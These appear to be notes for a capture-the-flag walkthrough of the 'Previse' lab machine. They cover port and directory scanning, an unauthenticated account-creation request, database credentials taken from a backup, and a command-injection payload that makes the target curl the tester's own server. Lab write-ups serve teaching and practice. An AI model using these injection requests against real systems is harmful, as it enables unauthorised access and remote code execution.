# web

Nmap tells is port 80 is open

```bash
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Previse Login
|_Requested resource was login.php
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Content
Looks like a login page (login.php)

![[Pasted image 20210809101736.png]]

## Gobuster
```bash
> gobuster dir -u http://10.10.11.104 -w ~/tools/wordlists/directory-list-lowercase-2.3-medium.txt -x php -o gobuster/root.gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/patrick/tools/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/08/09 10:31:23 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 2801] [--> login.php]
/login.php            (Status: 200) [Size: 2224]                
/download.php         (Status: 302) [Size: 0] [--> login.php]   
/files.php            (Status: 302) [Size: 6085] [--> login.php]
/header.php           (Status: 200) [Size: 980]                 
/nav.php              (Status: 200) [Size: 1248]                
/footer.php           (Status: 200) [Size: 217]                 
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/status.php           (Status: 302) [Size: 2970] [--> login.php]              
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/] 
/logout.php           (Status: 302) [Size: 0] [--> login.php]                 
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]              
/config.php           (Status: 200) [Size: 0]                                 
/logs.php             (Status: 302) [Size: 0] [--> login.php]             
```

## Create User
If you post to `accounts.php` you can create a user:
```bash
POST /accounts.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/login.php
Cookie: PHPSESSID=29j7ibhsojchid72tknestc125
Upgrade-Insecure-Requests: 1

username=c1sc0&password=c1sc0&confirm=c1sc0
```

![[Pasted image 20210809104020.png]]

## Login
![[Pasted image 20210809104039.png]]

## Download backup
There is a site backup you can download. Within the backup you can find the sql creds:
```bash
> cat config.php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

## Command injection
There is also a page which can download logs.

```php
/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    
```

So clearly we have command injection here:

```bash
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/file_logs.php
Cookie: PHPSESSID=29j7ibhsojchid72tknestc125
Upgrade-Insecure-Requests: 1

delim=comma%3b+curl+10.10.14.4/test.php
```

```bash
> sudo python3 -m http.server 80
[sudo] password for patrick: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.104 - - [09/Aug/2021 10:55:05] code 404, message File not found
10.10.11.104 - - [09/Aug/2021 10:55:05] "GET /test.php HTTP/1.1" 404 -
```
